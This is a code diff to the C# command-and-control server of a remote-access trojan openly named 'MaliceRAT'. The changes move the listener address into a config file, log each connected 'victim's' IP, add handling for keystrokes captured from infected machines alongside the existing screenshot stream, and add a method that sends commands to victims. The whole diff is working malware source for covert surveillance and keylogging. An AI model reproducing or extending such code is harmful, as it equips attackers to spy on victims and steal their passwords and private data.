@@ -4,9 +4,10 @@ using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
 using System.Collections.Generic;
-using System.Timers;
 using System.Runtime.InteropServices;
 using System.Web.Script.Serialization;
+using System.IO;
+using System.Windows.Forms;
 
 namespace MaliceRAT.RatServer
 {
@@ -17,16 +18,19 @@ namespace MaliceRAT.RatServer
         public event Action<Victim> ClientConnected;
         public event Action<Victim> ClientDisconnected;
         public event Action<byte[]> ScreenshotReceived;
+        public event Action<Victim, string> KeystrokeReceived;
+
+        private dynamic config;
         private TcpListener server;
-        private const int BufferSize = 1024 * 5;
-        private const double HeartbeatInterval = 5000;
-        private const int Port = 6666;
+        private int BufferSize;
+        private double HeartbeatInterval;
+        private string IP;
+        private int Port;
         public List<Victim> victims = new List<Victim>();
         private Dictionary<int, Task> clientTasks = new Dictionary<int, Task>();
-
         private StringBuilder screenshotBuilder = new StringBuilder();
         private JavaScriptSerializer serializer = new JavaScriptSerializer();
-
+        // Console
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool AllocConsole();
@@ -34,15 +38,36 @@ namespace MaliceRAT.RatServer
         public Server()
         {
             AllocConsole();
+            // Config
+            string configPath = Path.Combine(Application.StartupPath, "config.json");
+            if (File.Exists(configPath))
+            {
+                string configJson = File.ReadAllText(configPath);
+                config = serializer.Deserialize<dynamic>(configJson);
+
+                BufferSize = config["server_bufferSize"];
+                HeartbeatInterval = config["server_heartbeat"];
+                IP = config["server_ip"];
+                Port = config["server_port"];
+
+                Console.WriteLine("Config loaded from " + configPath);
+            }
+            else
+            {
+                Console.WriteLine("config.json not found.");
+                Application.Exit();
+            }
         }
+
         public void StartServer()
         {
-            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
+            IPAddress ipAddress = IPAddress.Parse(IP);
             server = new TcpListener(ipAddress, Port);
             server.Start();
             Console.WriteLine("Server started at " + server.LocalEndpoint);
             Task.Run(async () => await AcceptClients());
         }
+
         private async Task AcceptClients()
         {
             while (true)
@@ -63,7 +88,7 @@ namespace MaliceRAT.RatServer
                 byte[] buffer = new byte[BufferSize];
                 int bytesRead;
 
-                Timer heartbeatTimer = new Timer(HeartbeatInterval);
+                System.Timers.Timer heartbeatTimer = new System.Timers.Timer(HeartbeatInterval);
                 bool heartbeatReceived = true;
 
                 heartbeatTimer.Elapsed += async (sender, e) =>
@@ -98,6 +123,9 @@ namespace MaliceRAT.RatServer
                             string PC = jsonMessage["pc"].ToString();
                             string User = jsonMessage["user"].ToString();
 
+                            IPEndPoint clientEndPoint = client.TcpClient.Client.RemoteEndPoint as IPEndPoint;
+                            client.IP = clientEndPoint.Address.ToString();
+
                             client.OS = OS;
                             client.PC = PC;
                             client.User = User;
@@ -122,6 +150,12 @@ namespace MaliceRAT.RatServer
                         else if (jsonMessage["type"] == "stop_screenshots")
                         {
                             Console.WriteLine("Client has stopped sending screenshots: " + client.IP);
+                        }
+                        else if (jsonMessage["type"] == "keystroke")
+                        {
+                            string keystroke = jsonMessage["key"].ToString();
+                            Console.WriteLine($"Keystroke received from {client.IP}: {keystroke}");
+                            KeystrokeReceived?.Invoke(client, keystroke);
                         }
                     }
                     catch (InvalidOperationException)
@@ -237,6 +271,16 @@ namespace MaliceRAT.RatServer
                     timer.Stop();
                 };
                 timer.Start();
+            }
+        }
+
+        public void SendJson(int clientId, object jsonObject)
+        {
+            Victim client = GetVictimById(clientId);
+            if (client != null)
+            {
+                string jsonString = serializer.Serialize(jsonObject);
+                SendMessageToClient(client, jsonString);
             }
         }
     }
